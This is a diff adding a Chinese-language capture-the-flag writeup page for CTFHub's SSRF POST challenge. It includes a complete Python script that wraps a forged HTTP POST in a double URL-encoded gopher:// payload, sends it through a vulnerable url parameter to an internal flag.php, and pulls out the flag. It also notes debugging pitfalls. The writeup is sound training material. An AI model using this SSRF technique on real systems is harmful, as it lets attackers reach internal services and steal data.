@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SSRF POST请求 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SSRF POST请求 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SSRF, POST请求, Gopher协议, Python脚本, 双重编码</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SSRF / POST请求</li>
+        <li><strong>题目名称：</strong>POST请求</li>
+        <li><strong>环境：</strong>VS Code + Python 环境。</li>
+        <li><strong>目标：</strong>利用 SSRF 漏洞构造并发送 HTTP POST 请求，访问内网的 <code>/flag.php</code>，提交动态 key 以获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>利用 <strong>Gopher 协议</strong>构造任意 TCP 数据包，实现 SSRF 环境下的 POST 请求发送。题目明确指出“这次是发一个HTTP POST请求”，且后端使用 PHP 的 cURL 实现，因此必须使用 Gopher 协议来绕过 HTTP 协议只能发送 GET 请求的限制。</p >
+    
+    <div class="diff-box">
+        <strong>工具与方案选择：</strong>
+        <ul>
+            <li><strong>为什么不直接在浏览器输入框打 Gopher Payload？</strong> 浏览器会对 Gopher Payload 进行自动 URL 编码（包含特殊字符 <code>:</code>、<code>/</code>、<code>_</code>），导致后端接收时，原本构造好的 HTTP 报文换行符和空格被破坏，内网服务器无法解析，最终回显默认页面。</li>
+            <li><strong>Python 脚本的优势：</strong> 可以精确控制 Payload 的编码层级（双重编码），并通过正则表达式自动提取 Flag，避免手动复制带来的字符污染或遗漏。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：获取动态 key</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在浏览器访问 <code>?url=http://127.0.0.1/flag.php</code>，然后右键选择“查看页面源代码”。</p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>寻找服务端验证所需的动态 key。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>在 HTML 注释中发现 <code>&lt;!-- Debug: key=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx --&gt;</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认服务端要求 POST 提交该 key 才能获取 Flag。注意，此处必须使用 <code>http://</code> 协议触发 PHP 代码执行，若使用 <code>file://</code> 只能读取到未执行的源码 <code>&lt;?php echo $key;?&gt;</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 脚本构造 Gopher Payload</h3>
+        <div class="payload-box">
+            <p><strong>脚本代码：</strong></p>
+            <pre><code>import requests
+import urllib.parse
+import re
+
+# 1. 靶场 URL（注意不要包含 ?url=）
+base_url = "http://challenge-xxxx.sandbox.ctfhub.com:10800"
+
+# 2. 填入从源码中获取的动态 key
+key = "d1a797e1e354a968400e3eb68e13ebd7"
+
+# 3. 构造 POST Body
+post_body = f"key={key}"
+
+# 4. 构造原始 HTTP POST 请求报文
+raw_request = (
+    "POST /flag.php HTTP/1.1\r\n"
+    "Host: 127.0.0.1\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    f"Content-Length: {len(post_body)}\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+    f"{post_body}"
+)
+
+# 5. 第一次 URL 编码（对原始 HTTP 报文）
+encoded_http = urllib.parse.quote(raw_request)
+
+# 6. 拼接 Gopher 协议
+gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"
+
+# 7. 第二次 URL 编码（对整个 Gopher URL，防止特殊字符截断）
+final_payload = urllib.parse.quote(gopher_payload)
+
+# 8. 发送请求，直接拼接 URL 参数
+attack_url = f"{base_url}/?url={final_payload}"
+print("[*] 正在发送攻击请求...")
+
+try:
+    r = requests.get(attack_url, timeout=10)
+    # 9. 使用正则精准提取 Flag
+    match = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
+    if match:
+        print("\n[+] 成功获取 Flag！")
+        print(f"[+] {match.group(0)}")
+    else:
+        print("[-] 未提取到 Flag，原始回显如下：")
+        print(r.text[:500])
+except Exception as e:
+    print("[-] 请求出现异常：", e)</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>import requests, urllib.parse, re</code>：导入网络请求模块、URL 编码模块和正则表达式模块。</li>
+            <li><code>post_body = f"key={key}"</code>：构造 POST 请求的 Body 内容。</li>
+            <li><code>raw_request</code>：严格按照 HTTP 协议拼装报文。换行必须使用 <code>\r\n</code>，<code>Content-Length</code> 必须动态计算 Body 的真实长度（<code>len(post_body)</code>）。</li>
+            <li><code>urllib.parse.quote(raw_request)</code>：<strong>第一次 URL 编码</strong>。Python 的 quote 函数会自动将 <code>\r\n</code> 编码为 <code>%0D%0A</code>，空格编码为 <code>%20</code>。这一步绝不能手动 replace，否则会导致 <code>%0D%0D%0A</code> 的畸形换行符，破坏 HTTP 报文结构。</li>
+            <li><code>gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"</code>：拼接 Gopher 协议头。Gopher 协议通过 <code>_</code> 后面拼接经过编码的 TCP 数据流。</li>
+            <li><code>final_payload = urllib.parse.quote(gopher_payload)</code>：<strong>第二次 URL 编码（关键步骤）</strong>。因为 Gopher URL 是作为 <code>?url=</code> 参数的值进行传递的，如果直接发送，其中的 <code>:</code>、<code>/</code>、<code>_</code> 等特殊字符会被服务器或浏览器截断，导致请求失败。对整个 URL 再次编码，能确保 Payload 完整送达。</li>
+            <li><code>requests.get(attack_url)</code>：直接拼接 URL 发送请求，避免 requests 库对 params 参数进行自动编码带来的干扰。</li>
+            <li><code>re.search(r'ctfhub\{[a-f0-9]+\}', r.text)</code>：用正则表达式从 HTML 响应中精准提取纯净的 Flag 字符串，避免复制到无关的 HTML 标签。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：执行脚本获取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>执行操作：</strong>在 VS Code 终端中运行脚本。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印出 <code>[+] ctfhub{94854d51faefd2992947f617}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>Gopher POST 请求构造成功，提交 Flag 后通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：协议混淆导致获取 Key 失败。</strong> 使用 <code>file:///var/www/html/flag.php</code> 读取源码时，只能得到未被执行的 PHP 代码 <code>&lt;?php echo $key;?&gt;</code>。必须使用 <code>http://127.0.0.1/flag.php</code> 让服务器执行该文件，才能在渲染后的 HTML 注释中获取真实的动态 key 值。</li>
+        <li><strong>坑2：画蛇添足的 replace 导致双重编码灾难。</strong> 最初在第一次编码后加上了 <code>encoded_http = encoded_http.replace("%0A", "%0D%0A")</code>。由于 Python 的 <code>quote()</code> 已经自动将 <code>\r\n</code> 转成了 <code>%0D%0A</code>，再次 replace 会把 <code>%0A</code> 替换为 <code>%0D%0A</code>，导致最终结果变成 <code>%0D%0D%0A</code>。这种畸形的换行符导致 HTTP 报文头部与 Body 的分界失效，内网服务器无法正确解析 POST 请求。</li>
+        <li><strong>坑3：Content-Length 未动态计算。</strong> 在改变 Body 内容（从 <code>flag=1</code> 改为 <code>key=xxx</code>）后，长度从 6 变成了 36。如果未使用 <code>len(post_body)</code> 动态计算，而是硬编码长度，HTTP 请求体会被截断，导致 POST 数据不完整，验证失败。</li>
+        <li><strong>坑4：脏数据缓存导致的假象。</strong> 由于之前发送了畸形请求，后端返回了错误的容错页面。正则表达式 <code>re.search</code> 恰好从缓存页面中匹配到了旧环境残留的 Flag（<code>b644...</code>），导致我们误以为脚本运行成功，实则是匹配到了无效的过期数据。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>Gopher 协议构造 POST 请求的核心逻辑：</strong> 构造合法的 HTTP 报文 -> 第一次 URL 编码 -> 拼接 Gopher 协议头 -> 对整个 Gopher URL 进行第二次 URL 编码。</li>
+        <li><strong>动态 Key 的处理：</strong> CTF 题目中经常遇到由服务端动态生成的校验值，必须通过触发代码执行的方式获取（如使用 <code>http://</code> 协议），而不能仅通过读文件源码获取。</li>
+        <li><strong>脚本编写规范：</strong> 使用 Python 自动计算 Content-Length、使用正则提取 Flag、使用双重编码保护特殊字符，是 SSRF Gopher 攻击的标准模板。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
